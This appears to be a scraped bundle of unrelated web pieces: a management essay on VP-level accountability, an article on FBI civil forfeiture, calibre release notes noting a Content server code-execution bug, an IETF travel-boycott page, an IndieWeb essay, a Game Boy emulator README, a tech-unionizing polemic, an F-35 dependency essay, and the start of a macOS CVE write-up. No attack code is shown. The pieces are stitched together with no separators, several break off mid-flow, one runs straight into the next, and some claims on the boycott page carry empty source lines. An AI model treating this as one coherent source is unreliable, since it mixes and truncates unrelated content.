<div id="readability-page-1" class="page"><div>
				<p>It’s no secret that I’m not a fan of big-company HR practices.&nbsp; I’m more of the <a href="http://www.amazon.com/First-Break-All-Rules-Differently-ebook/dp/B00HL2S4LW">First Break all the Rules</a> type.&nbsp; Despite my general skepticism of many standard practices, we still do annual performance reviews at my company, though I’m thinking seriously of dropping them.&nbsp; (See <a href="http://www.amazon.com/Get-Rid-Performance-Review-Managing/dp/B004X8WB48">Get Rid of the Performance Review</a>.)</p>
<p>Another practice I’m not hugely fond of is “leveling” — the creation of a set of granular levels to classify jobs across the organization.&nbsp; Leveling typically results in something that looks like this:</p>
<p><a href="https://i0.wp.com/kellblog.com/wp-content/uploads/2015/03/level.png?ssl=1"><img data-recalc-dims="1" fetchpriority="high" decoding="async" src="https://i0.wp.com/kellblog.com/wp-content/uploads/2015/03/level.png?resize=500%2C114&amp;ssl=1" alt="level" width="500" height="114"></a></p>
<p>While I am a huge fan of compensation benchmarking (i.e., figuring out what someone is worth in the market before they do by getting another job), I think classical leveling has a number of problems:</p>
<ul>
<li>It’s futile to level across functions. Yes, you might discover that a Senior FPA Analyst II earns the same as a Product Marketing Director I, but why does that matter?&nbsp; It’s a coincidence.&nbsp; It’s like saying with $3.65 I can buy either a grande non-fat latte or a head of organic lettuce.&nbsp; What matters is the fair price of each of those goods in the market — not they that happen to have the same price.&nbsp; So I object to the whole notion of levels across the organization. &nbsp;It’s not canonical; it’s coincidence.</li>
</ul>
<ul>
<li>Most leveling systems are too granular, with the levels separated by arbitrary characterizations. It’s makework.&nbsp; It’s fake science.&nbsp; It’s bureaucratic and encourages a non-thinking “climb the ladder” approach to career development.&nbsp; (“Hey, let’s develop you to go from somewhat-independent to rather-independent this year.”)</li>
</ul>
<ul>
<li>It conflates career development and salary negotiation. It encourages a mindset of saying, “what must I do to make L10” when you want to say, “I want a $10K raise.”&nbsp; I can’t tell you the number of times people have asked me for “development” or “leveling” conversations where I get excited and start talking about learning, skills gaps, and such and it’s clear all they wanted to talk about was salary.&nbsp; Disappointing.</li>
</ul>
<p>That said, I do believe there are three meaningful levels in management and it’s important to understand the differences among them.&nbsp; I can’t tell you the number of times someone has sincerely asked me, “what does it take to be a director?” or, “how can I develop myself into a VP?”</p>
<p>It’s a hard question.&nbsp; You can turn to the leveling system for an answer, but it’s not in there.&nbsp; For years, in fact, I’ve struggled to find what I consider to be a good answer to the question.</p>
<p>I’m not talking about Senior VP vs. Executive VP or Director vs. Senior Director.&nbsp; I view such adjectives as window dressing or <a href="https://www.englishclub.com/ref/esl/Idioms/E/earn_your_stripes_162.htm">stripes</a>:&nbsp; important recognition along the way, but nothing that fundamentally changes one’s level.</p>
<p>I’m not talking about how many people you manage.&nbsp; In call centers, a director might manage 500 people.&nbsp; In startups, a VP might manage zero.</p>
<p>I am talking about one of three levels at which people operate:&nbsp; manager, director, and vice president.&nbsp; Here are my definitions:</p>
<ul>
<li><strong>Managers are paid to drive results with some support</strong>. They have experience in the function, can take responsibility, but are still learning the job and will have questions and need support.&nbsp; They can execute the tactical plan for a project but typically can’t make it.</li>
</ul>
<ul>
<li><strong>Directors are paid to drive results with little or no supervision</strong> (“set and forget”). Directors know how to do the job.&nbsp; They can make a project’s tactical plan in their sleep.&nbsp; They can work across the organization to get it done.&nbsp; I love strong directors.&nbsp; They get shit done.</li>
</ul>
<ul>
<li><strong>VPs are paid to make the plan</strong>. Say you run marketing.&nbsp; Your job is to understand the company’s business situation, make a plan to address it, build consensus to get approval of that plan, and then go execute it.</li>
</ul>
<p>The biggest single development issue I’ve seen over the years is that many VPs still think like directors. [1]</p>
<p>Say the plan didn’t work.&nbsp;&nbsp; “But, we executed the plan we agreed to,” they might say, hoping to play a get-out-of-jail-free card with the CEO (which is about to boomerang).</p>
<p>Of course, the VP got approval to execute the plan. &nbsp;Otherwise, you’d be having a different conversation, one about termination for insubordination.</p>
<p>But the plan didn’t work.&nbsp; Because directors are primarily execution engines, they can successfully play this card.&nbsp; Fair enough.&nbsp; Good directors challenge their plans to make them better.&nbsp; But they can still play the approval&nbsp;card successfully because their primary duty is to execute the plan, not make it.</p>
<p>VP’s, however, cannot play the approval card. &nbsp;The VP’s job is to get the right answer. &nbsp;They are the functional expert.&nbsp; No one on the team knows their function better than they do.&nbsp; And even if someone did, they are still playing the VP of function role and it’s their job – and no one else’s — to get the right answer.</p>
<p>Now, you might be thinking, “glad I don’t work for Dave” right now — he’s putting failure of a plan to which he and the team agreed on the back of the VP.&nbsp; And I am.</p>
<p>But it’s the same standard to which the CEO is held.&nbsp; If the CEO makes a plan, gets it approved by the board, and executes it well but it doesn’t work, they cannot tell the board “but, but, it’s the plan we agreed to.”&nbsp; Most CEOs wouldn’t even dream of saying that.&nbsp; It’s because CEOs understand they are held accountable not for effort or activity, but results.</p>
<p>Part of truly operating at the VP level is to internalize this fact.&nbsp; You are accountable for results.&nbsp; Make a plan that you believe in.&nbsp; Because if the plan doesn’t work, you can’t hide behind approval.&nbsp; Your job was to make a plan that worked.&nbsp; If the risk of dying on a hill is inevitable, you may as well die on your own hill, and not someone else’s.</p>
<p>Paraphrasing the ancient <a href="https://www.youtube.com/watch?v=OHug0AIhVoQ">Fram oil filter commercial</a>, I call this “you can fire me now or fire me later” principle.&nbsp; An executive should never sign up for a plan they don’t believe in.&nbsp; They should risk being fired now for refusing to sign up for the plan (e.g., challenging assumptions, delivering bad news) as opposed to halfheartedly executing a plan they don’t believe in and almost certainly getting fired for its failure later. &nbsp;The former is a far better way to go than the latter.</p>
<p>This is important not only because it prepares the VP to one day become a&nbsp; CEO, but also because it empowers the VP in making their plan.&nbsp; If this my plan, if I am to be judged on its success or failure, if I am not able to use approval as a get-out-of-jail-free card, then is it the right plan?</p>
<p>That’s the thinking I want to stimulate. &nbsp;That’s how great VPs think.</p>
<p># # #</p>
<p><strong>Footnotes</strong>:</p>
<p>[1] Since big companies throw around the VP title pretty casually, this post is arguing that many of those VPs are actually directors in thinking and accountability. &nbsp;This may be one reason why big company VPs have trouble adapting to the e-staff of startups.</p>

<div id="readability-page-1" class="page"><div>
							<p><span>Almost four years ago to the day, the FBI entered U.S. Private Vaults (USPV), a storage business in Beverly Hills, and raided the safe-deposit boxes there, pocketing tens of millions of dollars in cash, valuables, and personal items. Among those owners was Linda Martin, from whom agents took $40,200—her life savings—despite that she had not been charged with a crime.</span></p> <p><span>Those charges would never come. Although USPV itself was ultimately indicted in federal court, the government had no case against unknowing customers like Martin, in a scheme that attorneys have </span><a href="https://reason.com/2021/08/04/prosecutors-tried-to-seize-57k-from-a-safe-deposit-box-because-its-owner-sold-bongs-without-a-permit/"><span>compared</span></a><span> to seizing property from individual apartment units because the tenants' landlord was suspected of criminal wrongdoing. At USPV, the agency confiscated over $100 million in valuables from a slew of such people via civil forfeiture, the legal process that allows the government to take people's property without having to prove its owners committed any crime.</span></p> <p><span>The FBI was found to have exceeded the terms of its warrant and to have <a href="https://reason.com/2024/01/23/appeals-court-fbis-safe-deposit-box-seizures-violated-fourth-amendment/">violated the Fourth Amendment</a>. But it still refused to give back Martin's life savings. She had opted not to store it in a bank account, she says, because she was saving it for a house and did not want to be tempted to spend it. Her bank, meanwhile, did not have a safe-deposit box available, prompting her to turn to USPV.</span></p> <p><span>About two years post-seizure, the bureau returned Martin's money—shortly after she filed a nationwide class-action lawsuit. But while the bureau may have hoped that would persuade her to drop it, she has continued with her suit, which was back in court last week and seeks a ruling that will prevent the FBI from proceeding with others as it did with her.</span></p> <p><span>At the core of her argument is the notice the federal government sent alerting her to the fact that agents had seized her property. The problem: It didn't give her a reason.</span></p> <p><span>Martin's claim, her </span><a href="https://ij.org/wp-content/uploads/2023/03/CADC-15-Brief-of-Appellant.pdf"><span>appellant brief</span></a><span> notes, "is that when the FBI attempts to forfeit someone's property, due process requires that it say why, citing </span><i><span>specific facts and laws</span></i><span>." Instead, the notice she received listed hundreds of possible federal crimes that would justify a seizure, though it didn't provide Martin's supposed connection to those offenses. "By sending notices that initiate and, often, consummate property's forfeiture—all without ever saying what exactly the FBI thinks justifies the forfeiture," her brief says, "the FBI deprives owners of crucial information they need to protect their rights."</span></p> <p><span>Those notices, which Martin alleges violate the Fifth Amendment, are standard practice for the bureau. And they have already drawn the ire of a federal judge, who in 2021 <a href="https://reason.com/2021/06/24/judge-orders-fbi-to-halt-forfeiture-of-cash-jewelry-from-safe-deposit-boxes/">ordered</a> the agency to halt its forfeiture from hundreds of USPV safe-deposit boxes because the "anemic" notices provided "no factual basis for the seizure."</span></p> <p><span>That ruling, however, applied only to those USPV plaintiffs. Martin would like to see it apply nationwide. "Without specific notice, property owners can't understand what this is all about, and therefore can't do any investigation or get meaningful advice from attorneys," says Robert Frommer, an attorney with the Institute for Justice, which is representing Martin. "Owners must decide whether to fight against the federal government, default, or plead for mercy, all without knowing why the FBI is doing this to them. It's therefore little surprise that 93% of federal forfeitures never get to a court, meaning the FBI gets to keep the money without ever telling </span><i><span>anyone</span></i><span> why they should be allowed to." The hearing last week was on a jurisdictional issue and has yet to be evaluated on the merits.</span></p> <p><span>From the outset, the USPV raid was defined by illegal activity—on the part of federal law enforcement. The warrant, which agents <a href="https://reason.com/2022/08/19/fbi-misled-judge-in-obtaining-warrant-to-seize-hundreds-of-safe-deposit-boxes/">misled a judge</a> to obtain, explicitly <a href="https://www.documentcloud.org/documents/20700649-21-notice-of-motion-and-motion-for-return-of-property-pursuant-to-fed-r-crim-p-41g/#document/p10">forbade</a> them from engaging in a "criminal search or seizure" of the content of the safe-deposit boxes; they violated that condition (and the Constitution) and did it anyway. Agents seized a litany of valuables, from cash to <a href="https://reason.com/2021/06/11/fbi-raid-safety-deposit-boxes-los-angeles-jennifer-paul-snitko-85-million-civil-forfeiture/">personal items</a>—a baptismal certificate, a marriage certificate, a birth certificate—to gold coins. (In the latter case, the FBI could not find 63 of those coins, belonging to Don Mellein, worth over $100,000. Oops!)</span></p> <p><span>But Martin's suit raises another issue, which strikes at the root: If the government cannot articulate why agents are taking someone's life savings, then perhaps they shouldn't be taking it.</span></p>						</div></div>]]></description>

<p>If you do not know what the Content server is, you do not use it, and these do not apply to you. If you have set a password to access the Content server that you have not shared with anyone, these do not affect you. A remote code execution bug in the Content server introduced in calibre version 6.9.0 (released on 2022-11-25) means that anyone with access to the server also has access to the rest of the computer the server is running on. If you are using a password to protect access to the server only people that know the password can gain access via the bug. Thanks to STAR Labs (<a href="https://starlabs.sg/">https://starlabs.sg</a>) for finding these vulnerabilities.</p>

<li><span>Much improved Kobo support [8.0.1]</span>
<p>calibre can now natively edit, view and convert KEPUB format files used by the Kobo. It also automatically converts EPUB to KEPUB when sending books to Kobo devices (can be configured by right clicking the kobo icon in calibre).</p>
</li>
<li><span>Connect to folder: Allow connecting a specific device [8.0.1]</span>
<p>calibre can now connect to a folder and treat it as though it is a USBMS based device. This is useful particularly on Chromebooks where USB devices appear as folders rather than actual devices.</p>
</li>
<li><span>Edit book: A new tool to create an audio overlay in EPUB files for all text using the Read aloud facility [7.21]</span>
<p>This allows readers of the book to listen to it with sentence tracking, even if they do not have a functioning text-to-speech system in the reading software. You can even assign different voices to different parts of the text for a more immersive experience. The tool is available from the Tools menu in the book editor.</p>
</li>
<li><span>PDF Input: Automatic header/footer detection and removal [7.20]</span>
<p>A new, dedicated PDF Input engine for calibre that implements automatic detection of headers and footers based on document analysis. The new engine is the default to go back to using the old engine, select it in the PDF Input section of the Conversion dialog.</p>
</li>
<li><span>E-book viewer: Halve the time taken to open large EPUB format books for the first time [7.19]</span>
<p>A four hundred thousand word EPUB book now opens in under a second on typical hardware.</p>
</li>
<li><span>E-book viewer: Read aloud: A new Text-to-Speech engine (Piper) that uses a neural network for realistic sounding voices [7.18]</span>
<p>To use it access the viewer controls and click the Read aloud button or press 'Ctrl+S'. The neural network is run locally, no cloud services are used. Using the OS Text-to-Speech engine is still possible by clicking the configure button on the Read aloud control bar. Note that the new engine highlights the currently read sentence rather than word.</p>
</li>
<li><span>E-book viewer: Support for jumping to and displaying paper edition page numbers [7.17]</span>
<p>If an e-book contains embedded information about the pages from the paper edition of the book, the calibre E-book viewer can now jump to a page number via the Go to button in the viewer controls. You can also optionally have the current paper edition page number displayed in the header/footer by adding "Pages from paper edition" to either the header or footer in the viewer settings.</p>
</li>
<li><span>E-book viewer: Allow saving current settings in "profiles" that can be quickly and easily swapped between [7.6]</span>
<p>Closes tickets: <a href="https://bugs.launchpad.net/calibre/+bug/1979022" target="_blank">1979022</a></p>
<p>To create a profile or switch to a previously saved profile access "Profiles" from the viewer controls or press the `Alt+P` shortcut.</p>
</li>

            They say:
        </p>
        <p>
                <em>"... it would be inappropriate to make any change without clear evidence of a direct issue"</em>
            </p>
        <p>
            However, the threat is real:
        </p>
        
        <p>
            The IETF Administration LLC has decided to continue to hold meetings in the US,
            in spite of significant threats to the safety of the community in traveling there.
            As an Internet community we strive to include everyone. Holding a meeting in the
            US is incompatible with our values.
            We call on the IETF community to refuse to travel to the 127<sup>th</sup> IETF meeting,
            to be held in San Francisco.
        </p>

        <h2>The US is dangerous</h2>
        <p>
            For many, the US was already a country for which it was not safe to travel to.
            But now, it is an actively hostile state to almost anyone travelling there.
        </p>
        <p>
            'Surely this won't affect me; I'm white, male, and European?' Think again.
            Here are the examples we know about of people being detained at the US border,
            and put into camps:
        </p>
        <ul>
            <li>A French scientist was deported for holding views critical of the Trump administration.

            </li>
            <li>A Canadian actor was detained for 2 weeks. Source:
                <a href="https://www.theguardian.com/us-news/2025/mar/18/canadian-actor-jasmine-mooney-detained-mexico-border">The Guardian</a>.
            </li>
            <li>A German engineer with permanent residency in the US (Green Card) is currently being detained. Source:
                <a href="https://www.theguardian.com/us-news/2025/mar/18/germany-investigates-after-national-with-green-card-arrested-at-us-border">The Guardian</a>.

            </li>
        </ul>
        <p>
            There are undoubtedly more cases we do not know about.
            These people are being held in utterly inhumane conditions, often without access to appropriate
            medical care, legal representation, food, nor even a bed. Some have been tortured.
        </p>
        <p>
            Beyond problems at the border, the current Secretary for Health and Human Services - Robert F. Kennedy Jr. -
            has said that he will send those with ADHD to camps. Source:

            Even if attendees get through the border, their safety during the meeting cannot be guaranteed.
        </p>
        <h2>'We can't just cancel meeting!'</h2>
        <p>
            We can, and we should.
        </p>
        <p>
            <a href="https://www.rfc-editor.org/rfc/rfc8718.html#RFC8711">RFC 8718</a> sets the
            criteria for the selection of a meeting venue for the IETF meetings. Amongst the <i>core</i> values listed
            is that of inclusiveness. Specifically, the IETF should:
        </p>
        <p>
                Avoid meeting in countries with laws that effectively exclude people on the basis of race, ethnicity,
                religion, gender, sexual orientation, national origin, citizenship, or gender identity.
            </p>
        <p>
            Additionally, <a href="https://www.rfc-editor.org/rfc/rfc9137.html">RFC 9137</a>
            sets the conditions on cancelling/relocating IETF meetings. Amongst examples of situations that should
            trigger a meeting cancellation are:
        </p>
        <div>
            <ul>
                <li>War, civil unrest, or a public health crisis could make a meeting unsafe and/or result in widespread
                    national or corporate travel bans.
                </li>
                <li>Changes in visa policies or other unexpected governmental restrictions might make the venue
                    inaccessible to numerous attendees.

<p>By <b>Susam Pal</b> on 22 Feb 2025</p>
<p>
  There's a corner of the Internet where people have been reclaiming
  their digital independence by hosting their own websites and
  promoting the idea of owning your own content—it's called the
  IndieWeb.  This community has its
  own <a href="https://indieweb.org/">website</a>, IRC channels,
  social media presence, etc.  This movement promotes the idea that
  individuals should control their own digital presence through
  personal websites.  But every time this topic comes up in online
  discussions, someone inevitably claims that the IndieWeb hasn't
  taken off!
</p>
<p>
  I feel that such claims about the IndieWeb not "taking off" are
  either stating the obvious or, if that's not the intention,
  completely missing the point.  It's like saying that gardening
  hasn't taken off because most people buy their vegetables at the
  supermarket.  The IndieWeb doesn't need to "take off" to be valuable
  to those who participate in it.  Maintaining a personal website is
  about owning your digital presence, embracing creative freedom, and
  expressing your individuality!  It's not about appealing to the
  masses!
</p>
<p>
  I remember how, in the early 2000s, I used to spend my spare time
  learning HTML and writing my website, one HTML tag at a time.
  Writing a few lines of code in a text editor and then watching the
  browser render that code into a vibrant web page full of colours and
  images felt like an art form.  It was doubly fun to find other
  netizens who shared that same joy of maintaining and publishing
  their websites.  The IndieWeb is about preserving that hacker
  culture where websites are crafted and hosted not for mass appeal
  but for the sheer joy of creation and sharing with like-minded
  individuals.
</p>
<p>
  The IndieWeb doesn't need to go mainstream to be meaningful.  It's a
  celebration of a more personal, decentralised, and creative world
  wide web.  For those of us who still care about these values, it is
  already meaningful.

  Retro Boy is a simple Game Boy emulator written in Rust that can be played on the web. <a href="https://smparsons.github.io/retroboy" rel="nofollow">Try it here.</a>
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Introduction</h2><a id="user-content-introduction" aria-label="Permalink: Introduction" href="#introduction"></a></p>
<p dir="auto">Retro Boy is a cycle-accurate Game Boy emulator written in Rust. It uses <code>wasm-pack</code> to translate the Rust code into WebAssembly so it can be played on the web. The web frontend then uses Web Audio API and HTML Canvas for audio and graphics. It also leverages the browser's local storage to persist cartridge RAM data for battery-backed MBC cartridges.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<ul dir="auto">
<li>Accurate CPU that passes all <a href="https://github.com/adtennant/GameboyCPUTests">JSON CPU tests</a></li>
<li>Accurate audio emulation</li>
<li>Graphics emulation built using a scanline-based renderer</li>
<li>MBC1, MBC3, MBC5, and HuC1 support</li>
<li>RTC support for MBC3 cartridges</li>
<li>Cartridge RAM that persists to browser local storage for battery-backed cartridges</li>
<li>Support for GameShark or GameGenie cheats</li>
<li>A web frontend that supports:
<ul dir="auto">
<li>Fullscreen mode</li>
<li>Pausing/resuming</li>
<li>Selectable monochrome or color modes</li>
<li>Customizable key map for game controls</li>
<li>Management and enabling/disabling of game cheat codes</li>
<li>A mobile-friendy responsive design</li>
</ul>
</li>
</ul>

<p dir="auto">To compile the implementation to WebAssembly, you will first need to install wasm-pack with the command <code>cargo install wasm-pack</code> if you haven't done so already. Then, run <code>sh ./build-wasm.sh</code> to build the core project and generate the Javascript binding code in the web frontend directory.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Web Frontend</h2><a id="user-content-web-frontend" aria-label="Permalink: Web Frontend" href="#web-frontend"></a></p>
<p dir="auto">The web frontend for this emulator is a React/TypeScript app designed with Material UI. It is located in the frontends/web folder. The UI provides the ability to load a ROM as well as play, pause, or reset the emulator. It also provides a fullscreen mode.</p>
<p dir="auto">To run the web frontend:</p>
<ol dir="auto">
<li>Compile the Rust code to WebAssembly and generate the Javascript binding code as described in the "How to Compile to WebAssembly" section.</li>
<li>When the binding code is generated, it will be added to the frontends/web/src/core directory.</li>
<li>Run <code>yarn install</code> in the frontends/web directory to install all dependencies.</li>
<li>Run <code>yarn start</code> in the same directory to run the application locally.</li>

<div id="readability-page-1" class="page"><div id="main">
        <h2>The Burnout Machine</h2>
        <p><i>Originally written by Biozombie, published in 2600 Hacker Quarterly, Autumn 2024</i></p>
        <p>
            Let’s get real for a minute: the tech industry loves to sell us on the myth of the "dream
            job."
            You
            know
            the
            pitch - beanbags in the office, free kombucha on tap, and "Agile" processes that are supposed to
            make
            everything
            more flexible, more efficient. But the reality? It’s a meat grinder that chews up developers,
            sysadmins,
            and
            infosec pros and spits them out the other side - burnt out, disillusioned, and disposable.
        </p>
        <p>
            We’re living in a world where billion dollar tech companies expect us to live and breathe code,
            demanding
            80
            hour weeks under the guise of "passion." And what do we get in return? Burnout, anxiety, and the
            constant
            threat
            of layoffs. It’s time to face facts: this industry is not your friend. It’s a machine, and
            unless we
            start
            organizing, it’s going to keep grinding us down. It’s time to talk about unionizing tech jobs.
        </p>
        <p>
            Remember when Agile was supposed to save us all? Flexible sprints, self-organizing teams - yeah, right. In
            practice, Agile has been twisted into a tool for management to push us harder and faster. They say
            it’s
            about
            "responding to change over following a plan," but let’s be honest - it’s about dangling
            more
            carrots
            and keeping
            us on a treadmill that never stops. The sprint becomes a marathon, and we’re the ones paying the
            price.

        </p>
        <p>
            And then there’s burnout. We’re in an industry where burnout isn’t just common -
            it’s
            expected. If you’re not
            pulling all-nighters, you’re "not committed." If you’re not answering Slack messages at
            midnight,
            you’re "not a
            team player." This culture is toxic, and it’s only getting worse. The relentless churn of
            projects,
            the
            constant
            pressure to innovate, and the ever-present threat of obsolescence create a perfect storm of stress. And
            what’s
            the industry’s solution? A mindfulness app and a lecture on work-life balance. Give me a break.
        </p>
        <p>
            Let’s talk about job security - because there isn’t any. The tech industry loves to hype itself
            as a
            meritocracy, where the best and the brightest rise to the top. But in reality, it’s a meat market. As
            soon
            as
            you’re not "on the cutting edge," you’re out. Outsourcing, contract work, gig economy
            bullshit -
            it’s all
            designed to keep us insecure, to keep us grinding away at the next big thing with no guarantee that
            we’ll
            have a
            job next week, next month, or next year.
        </p>
        <p>
            Companies love to brag about their innovation, but the real innovation is finding new ways to make us
            disposable. Permanent employment? That’s for suckers. Why pay benefits and offer job security when
            they
            can
            churn through contractors and freelancers like cheap code? And don’t get me started on those
            non-compete
            clauses
            - designed to keep you locked down and terrified to make a move that might actually be good for your career.
        </p>
        <p>
            And let’s not forget the ethical side of this equation. We’re being asked to build the future,
            to
            develop AI,
            blockchain, and all the other buzzword technologies that are supposed to change the world. But at what cost?
            How
            many of us have been forced to work on projects that make us sick to our stomachs - surveillance tech, data
            mining tools, algorithms that reinforce social biases - because we don’t have the power to say no?
        </p>
        <p>
            That’s the kicker. We’re the ones building the damn future, but we have no say in how it’s
            built. We don’t get
            to decide whether our code is used for good or for evil. And as long as we’re isolated, as long as
            we’re afraid
            to speak up because we might lose our jobs, nothing will change.
        </p>
        <p>
            This industry isn’t going to fix itself. The billionaires at the top aren’t going to suddenly
            grow a
            conscience,
            and they aren’t going to give us the power to push back. That power has to come from us - from
            organizing,
            from
            resisting, from breaking - unless we organize, unless we unionize.
        </p>
        <p>
            Unionizing isn’t just about getting better pay or benefits (though we desperately need both).
            It’s
            about taking
            back some control. It’s about having a say in how we work, what we work on, and how we’re
            treated.
            It’s about
            saying no to the endless churn, the burnout culture, the gig economy bullshit.
        </p>
        <p>
            And don’t let anyone tell you it’s impossible. The Alphabet Workers Union at Google?
            They’re
            showing us it can
            be done. They’re standing up to one of the biggest companies in the world and saying,
            "Enough." We
            need
            more of
            that. We need to take that energy and spread it across the industry - across all the companies that are
            profiting off our sweat and tears.
        </p>
        <p>
            Hackers, we’ve always been about more than just code. We’ve been about freedom - freedom of
            information, freedom
            from control. Unionizing is the next logical step. It’s about taking the hacker ethos into the
            workplace,
            about
            organizing to protect ourselves and each other.
        </p>
        <ul>
            <li><strong>Start the Conversation:</strong> Talk to your coworkers. Break the silence. The first step to
                organizing is
                realizing you’re not alone.
            </li>
            <li><strong>Support Existing Efforts:</strong> If you’re in a company where union efforts are already
                underway, get
                involved.
                If not, start thinking about how you can start one.
            </li>
            <li><strong>Use Your Skills:</strong> We’re hackers - we know how to communicate securely, how to
                organize without
                being
                detected. Let’s use those skills to build something real, something that can stand up to the
                powers that
                be.</li>
            <li><strong>Push for Ethics:</strong> Let’s make sure that any union platform we build isn’t
                just about wages and
                hours, but
                about ethics too. We need to have a say in what we’re building and how it’s used.</li>
        </ul>
        <p>
            The tech industry is a runaway train, and if we don’t do something soon, we’re going to get run
            over. The
            burnout, the job insecurity, the nightmares - it’s all going to keep getting worse unless we take a
            stand.
            Unionizing isn’t just a nice idea - it’s a necessity.
        </p>
        <p>
            So let’s do what hackers do best: let’s disrupt. Let’s take the tools they’ve given
            us, the skills we’ve
            honed, and use them to build something better. Let’s unionize. Let’s take back our industry,
            take back our
            jobs, and take back our futures.
        </p>
        <p>
            The future of tech is being written right now, and it’s up to us to decide what kind of story it will
            be.
            Let’s make it a story we can be proud of.
        </p>

The F-35 isn't merely a stealth jet with superior aerodynamics; its true power lies in its ability to network, process, and act on actionable intelligence. Without this network, the F-35's value diminishes significantly. In this sense, owning an F-35 is less about military hardware and more about subscribing to an American-led defense architecture.</p><p>Imagine buying a state-of-the-art smartphone, but its full functionality is locked behind a subscription service. The hardware is impressive, but the value lies in the constant updates, cloud services, and access to a broader network. Without the subscription, you're left with a device that underperforms and slowly becomes obsolete.

It's expensive, sleek, and impressive. However, the true operational capability only comes with continuous access to:</p><ol><li><p><strong>Software Updates</strong><span>: The F-35 is driven by complex software systems that require constant updates to maintain operational effectiveness, security, and functionality. Without these updates, the jet's capabilities degrade over time.</span></p></li><li><p><strong>Actionable Intelligence</strong><span>: The F-35 is designed to integrate seamlessly with U.S. and allied ISR (Intelligence, Surveillance, Reconnaissance) networks. Without access to this data stream, much of the F-35's advantage in situational awareness disappears.</span></p></li><li><p><strong>Maintenance and Parts</strong><span>: The jet relies on a tightly controlled supply chain managed by the U.S. and its defense contractors. Ongoing maintenance, replacement parts, and technical support are essential to keeping the aircraft mission-ready.</span></p></li><li><p><strong>Security Patches</strong><span>: Cybersecurity is crucial for a data-heavy platform like the F-35. The U.S. controls the security protocols and patches, meaning any vulnerability is managed centrally.</span></p></li></ol><p>Each of these elements functions as a component of the "subscription." Lose access to any of these, and the value of the F-35 is severely diminished.</p><p><em><strong>Hate Subscriptions? </strong><span>Me too! You can support me with a one time contribution to my research at Buy Me a Coffee. </span><a href="https://buymeacoffee.com/researchukraine" rel="">https://buymeacoffee.com/researchukraine</a></em></p><p>The subscription model introduces significant geopolitical risk. The United States retains ultimate control over the F-35 network, meaning it can "de-platform" a nation if relations deteriorate. The case of Turkey illustrates this perfectly. After Ankara purchased the Russian S-400 air defense system—deemed a security risk by the U.S.—Turkey was expelled from the F-35 program. The U.S. cut off access to software, parts, and updates, rendering Turkey's F-35 ambitions null.</p><p>This risk forces countries to consider not just the upfront cost of the jet but the long-term political and strategic alignment with the United States. Owning an F-35 means adhering to U.S. defense policies and strategic priorities. Failure to do so can result in being cut off from the vital updates and information streams that keep the aircraft effective.</p><p>***</p><p>Countries that invest in the F-35 must balance the pursuit of military capability against the loss of strategic autonomy. While the F-35 offers unparalleled technological superiority, it also binds nations to the U.S. defense ecosystem.</p><p>In contrast, some nations have found ways to enhance autonomy even when starting with U.S.-designed platforms:</p><blockquote><p><span>● </span><strong>Japan's Mitsubishi F-2</strong><span>: Based on the F-16, Japan's F-2 is larger, incorporates indigenous avionics, and utilizes advanced composite materials for stealth and durability. It also features Japan-developed radar systems, allowing for greater self-reliance in manufacturing and operations.</span></p><p><span>● </span><strong>Israel's F-35I Adir</strong><span>: Israel secured the unique right to modify its F-35s. The F-35I includes Israeli-designed electronic warfare systems, sensors, and weapons, enhancing operational independence and ensuring that Israel can tailor the platform to its unique threat environment.</span></p></blockquote><p>These examples show that some nations strive for autonomy even within U.S.-controlled frameworks, negotiating terms that allow greater self-sufficiency.</p><p>***</p><p>The initial acquisition of the F-35 is just the beginning. Ongoing costs related to software upgrades, maintenance, and intelligence sharing can be substantial. Moreover, this dependency means that countries cannot operate the F-35 entirely on their own terms. Any political divergence from Washington risks the suspension of essential services, leaving an expensive but underperforming fleet.</p><p>This raises an important strategic question: Why invest in a platform that can be deactivated by another country's political decision? Why commit to a system where sovereignty is, to some extent, compromised?</p><p>***</p><p>For smaller nations, buying an F-35 means entering a long-term defense subscription with the United States. This provides advanced capabilities but also exposes them to significant leverage by Washington. If relations sour, the F-35 can be reduced to little more than an expensive, under-utilized platform.</p><p>In many ways, the F-35 is a tool of both defense and diplomacy. It strengthens alliances and ensures interoperability, but it also functions as a strategic tether. For nations seeking the most advanced combat capabilities, this tether may be worth it. For those valuing sovereignty and independence, it presents a dilemma: superior firepower at the cost of control.</p><p>***</p><p>The F-35 isn't just a fighter jet; it's a subscription service with geopolitical strings attached. Nations that buy into the program gain access to unmatched aerial and data capabilities—but they also cede a measure of control to the United States. The question each country must ask is whether the benefits of the "subscription" outweigh the costs of dependency. Because when the subscription is canceled, the F-35 becomes little more than an expensive monument to what might have been.</p><p><em>Benjamin Cook continues to travel to, often lives in, and works in Ukraine, a connection spanning more than 14 years.

    <h2>Introduction</h2>
    <p>This article discusses a vulnerability, <b>CVE-2024-54471</b>, that was patched as part of the <a href="https://support.apple.com/en-us/100100">Apple security releases</a>: <b>macOS Sequoia 15.1, macOS Sonoma 14.7.1, and macOS Ventura 13.7.1</b> (all released on October 28th, 2024). If you use a macOS device and are not on one of these updated versions: <strong><em>update now!</em></strong></p>
    <p>This article is going to start with a lot of setup. I need to lay out some definitions and explain several concepts before jumping into the actual exploitation details. If you want, you can <a target="_self" href="#exploitation-time">skip to the juicy exploitation info.</a> For everyone else, thank's for coming along for the ride! Let me start by explaining inter-process communication on macOS.</p>
    <h2>What is a Kernel?</h2>
    <p>In an operating system, the code responsible for communicating with hardware and presenting a multi-tasking model to the applications (among many other things) is called the <b>kernel.</b> When code is executed in the kernel, it is said to be in <b>kernel space,</b> while code that is executed outside of the kernel (i.e. most applications) is said to be in <b>user space.</b> The separation between user space and kernel space is often an important security barrier.</p>
    <p>The kernel for macOS (and pretty much all Apple OS's) is known as <b><a href="https://github.com/apple-oss-distributions/xnu/tree/main">XNU.</a></b> XNU is a hybrid kernel, containing parts of the <abbr title="Berkeley Software Distribution">BSD</abbr> kernel and its variants, as well as a (now heavily-modified) variant of the Mach kernel. Interestingly, it appears that Apple is one of the only organizations out there that is still actively maintaining a Mach kernel variant. While the Free Software Foundation's GNU Hurd kernel is based on their own variant called GNU Mach, development on the GNU Hurd kernel project is very minimal today.</p>
    <h2>A (Not-So)-Brief History of Mach</h2>
